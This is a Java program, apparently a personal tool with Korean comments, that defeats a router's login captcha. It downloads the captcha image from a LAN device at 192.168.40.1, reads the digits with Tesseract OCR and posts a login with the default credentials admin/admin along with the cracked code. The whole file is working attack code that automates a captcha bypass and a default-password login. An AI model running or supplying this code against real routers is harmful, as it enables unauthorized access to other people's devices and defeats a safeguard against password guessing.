import net.sourceforge.tess4j.Tesseract;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.CookieManager;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AutoCaptchaBreaker {
    public static void main(String[] args) {
        String targetIp = "192.168.40.1";

        try {
            CookieManager cookieManager = new CookieManager();
            HttpClient client = HttpClient.newBuilder()
                    .cookieHandler(cookieManager)
                    .build();

            // --- [STEP 1] 캡차 제어 HTML 수신 및 파일명 추출 ---
            System.out.println("[*] 캡차 제어 데이터 수신 중...");
            HttpRequest getHtml = HttpRequest.newBuilder()
                    .uri(URI.create("http://" + targetIp + "/sess-bin/captcha.cgi"))
                    .GET().build();
            HttpResponse<String> htmlRes = client.send(getHtml, HttpResponse.BodyHandlers.ofString());
            String htmlBody = htmlRes.body();

            // 정규표현식으로 파일명(value 값) 추출
            Pattern pattern = Pattern.compile("name=captcha_file value=([a-zA-Z0-9]+)");
            Matcher matcher = pattern.matcher(htmlBody);

            if (!matcher.find()) {
                System.err.println("[오류] HTML에서 captcha_file 값을 찾을 수 없습니다.");
                System.err.println("응답 내용: " + htmlBody);
                return;
            }
            String captchaFileId = matcher.group(1);
            System.out.println("[확인] 추출된 파일 ID: " + captchaFileId);

            // --- [STEP 2] 실제 이미지 다운로드 ---
            String realImgUrl = "http://" + targetIp + "/captcha/" + captchaFileId + ".gif";
            System.out.println("[*] 실제 이미지 다운로드 중: " + realImgUrl);

            HttpRequest getImg = HttpRequest.newBuilder().uri(URI.create(realImgUrl)).GET().build();
            HttpResponse<InputStream> imgRes = client.send(getImg, HttpResponse.BodyHandlers.ofInputStream());

            File imgFile = new File("captcha.gif");
            try (InputStream is = imgRes.body(); FileOutputStream fos = new FileOutputStream(imgFile)) {
                is.transferTo(fos);
            }

            // --- [STEP 3] OCR 판독 ---
            BufferedImage image = ImageIO.read(imgFile);
            if (image == null) {
                System.err.println("[오류] 이미지 디코딩 실패 (파일이 깨졌을 수 있음)");
                return;
            }

            String projectRoot = System.getProperty("user.dir");
            Path resourcePath = Paths.get(projectRoot, "src", "main", "resources");

            Tesseract tesseract = new Tesseract();
            tesseract.setDatapath(resourcePath.toString());
            tesseract.setLanguage("eng");
            tesseract.setVariable("tessedit_char_whitelist", "0123456789");
            tesseract.setPageSegMode(7);

            String crackedCode = tesseract.doOCR(image).trim().replaceAll("[^0-9]", "");
            System.out.println("[OCR 결과] 판독된 번호: [" + crackedCode + "]");

            // --- [STEP 4] 로그인 시도 (captcha_file 값 포함 필수) ---
            if (!crackedCode.isEmpty()) {
                System.out.println("[*] 로그인 요청 전송...");

                // 주의: captcha_file 파라미터가 반드시 포함되어야 합니다.
                String payload = "username=admin&passwd=admin&init_status=1&captcha_on=1" +
                        "&captcha_file=" + captchaFileId +
                        "&captcha_code=" + crackedCode;

                HttpRequest loginReq = HttpRequest.newBuilder()
                        .uri(URI.create("http://" + targetIp + "/sess-bin/login_handler.cgi"))
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .header("Referer", "http://" + targetIp + "/login/login.php")
                        .POST(HttpRequest.BodyPublishers.ofString(payload))
                        .build();

                HttpResponse<String> loginRes = client.send(loginReq, HttpResponse.BodyHandlers.ofString());
                System.out.println("\n<< [서버 응답]:\n" + loginRes.body());

                if (loginRes.body().contains("timepro.cgi")) {
                    System.out.println("[★성공★] 로그인 통과!");
                } else {
                    System.out.println("[실패] 거부됨.");
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}